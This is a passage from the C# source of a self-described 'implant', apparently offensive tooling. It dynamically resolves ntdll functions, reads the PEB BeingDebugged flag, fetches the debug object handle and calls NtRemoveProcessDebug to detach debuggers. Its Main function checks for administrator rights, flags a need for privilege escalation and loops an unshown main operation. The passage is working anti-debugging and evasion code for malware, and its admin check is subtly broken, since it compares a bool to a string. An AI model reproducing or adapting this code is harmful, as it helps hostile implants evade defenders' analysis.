                    Console.WriteLine("\n[!] Status: Implant is attached to a Debugger: {0}\n", IsDebuggerPresent());
                    System.Environment.Exit(1);
                }
                */

                // ProcessBasicInformation: In processInformationClass, https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess

                IntPtr phandle = Process.GetCurrentProcess().Handle;

                // http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html
                // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
                // https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb


                // https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.sizeof?view=net-6.0
                // Returns the unmanaged size of an object in bytes
                uint processInformationLength = (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));


                // https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=net-6.0#system-runtime-interopservices-marshal-allochglobal(system-int32)
                // public static IntPtr AllocHGlobal (int cb);
                // Input parameter, cb = The required number of bytes in memory

                //      cb != processInformationLength
                // or,  cb != (uint)Marshal.SizeOf(typeof(ProcessBasicInformation))
                // cb == Marshal.SizeOf(typeof(ProcessBasicInformation));

                // as the number required by cb should be in bytes.

                IntPtr processInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));

                uint returnLength = 0;

                /*
                // PInvoke
                NtQueryInformationProcess(
                phandle,
                0,
                processInformation,         // -> [out]     =>  returns processInformation
                processInformationLength,
                ref returnLength
                );
                */

                // delegate
                IntPtr funcaddr7 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
                NtQIP ntqip = (NtQIP)Marshal.GetDelegateForFunctionPointer(funcaddr7, typeof(NtQIP));

                ntqip(
                phandle,
                0,
                processInformation,         // -> [out]     =>  returns processInformation
                processInformationLength,
                ref returnLength
                );


                // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
                // https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=net-6.0#system-runtime-interopservices-marshal-ptrtostructure(system-intptr-system-type)
                
                // link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view
                // returns: object type -> needs typecasting
                PROCESS_BASIC_INFORMATION pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(PROCESS_BASIC_INFORMATION));

                // Getting the base address of the PEB structure of our current process
                // According to https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb:
                // Baseaddress of PEB + 2 byte (RVA) = Absolute address of the BeingDebugged member of the PEB structure
                
                // Getting base address of PEB
                IntPtr Pebptr = pbi.PebAddress;
                
                // Getting absolute address of BeingDebugged member of the PEB structure
                // link: https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.readbyte?view=net-6.0#system-runtime-interopservices-marshal-readbyte(system-intptr)
                byte check = Marshal.ReadByte(Pebptr+2);

                if (check.Equals(1))
                {
                    Console.Write("\n[!] Status: Implant is attached to a Debugger\t");

                    //Detaching our implant from attached debugger
                    // http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html


                    // https://stackoverflow.com/questions/1456861/is-intptr-zero-equivalent-to-null
                    IntPtr debuggerhandle = IntPtr.Zero;

                    uint outlength = 0;

                    /*
                    // PInvoke
                    NtQueryInformationProcess(
                    phandle,
                    0x1e,               // ProcessDebugObjectHandle = 0x1E
                    ref debuggerhandle,
                    8,          // 64bit => 8byte
                    ref outlength
                    );
                    */

                    // delegate
                    IntPtr funcaddr8 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
                    NtQIP2 ntqip2 = (NtQIP2)Marshal.GetDelegateForFunctionPointer(funcaddr8, typeof(NtQIP2));

                    ntqip2(
                    phandle,
                    0x1e,               // ProcessDebugObjectHandle = 0x1E
                    ref debuggerhandle,
                    8,          // 64bit => 8byte
                    ref outlength
                    );


                    Console.WriteLine("-> Debug handle: {0}", debuggerhandle);

                    Console.Write("[*] Trying to detach Debugger : ");
                    //calling NtRemoveProcessDebug for Detaching debugger from implant process
                    // PInvoke
                    //int status = NtRemoveProcessDebug(phandle, debuggerhandle);

                    // delegate
                    IntPtr funcaddr9 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRemoveProcessDebug");
                    NtRPD ntrpd = (NtRPD)Marshal.GetDelegateForFunctionPointer(funcaddr9, typeof(NtRPD));

                    int status = ntrpd(phandle, debuggerhandle);

                    if (status == 0)
                    {
                        Console.WriteLine("[DONE!]");
                    }
                    else
                    {
                        Console.WriteLine("[Oops! Unable to detach...]");
                    }
                }   
            }

            static void Main()
            {
                bool check = IsAdministrator();
                if (check.Equals("true"))
                {
                    Console.WriteLine("\n[+] [ Current user is Admininstrator! ]");
                }
                else
                {
                    Console.WriteLine("\n[+] [ Current user is Not Admininstrator => Privilege Escalation is needed! ]");
                }
                CheckDebugger();

                while(true)
                {
                    MainOperation();
                }
            }
        }
    }
}
